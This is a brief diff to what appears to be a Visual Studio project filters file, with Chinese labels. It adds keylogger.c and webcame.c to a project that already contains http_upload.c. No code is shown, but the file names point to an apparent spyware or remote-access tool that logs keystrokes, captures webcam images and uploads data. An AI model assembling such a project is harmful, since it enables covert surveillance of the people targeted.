@@ -57,5 +57,11 @@
     <ClCompile Include="http_upload.c">
       <Filter>源文件</Filter>
     </ClCompile>
+    <ClCompile Include="keylogger.c">
+      <Filter>源文件</Filter>
+    </ClCompile>
+    <ClCompile Include="webcame.c">
+      <Filter>源文件</Filter>
+    </ClCompile>
   </ItemGroup>
 </Project>
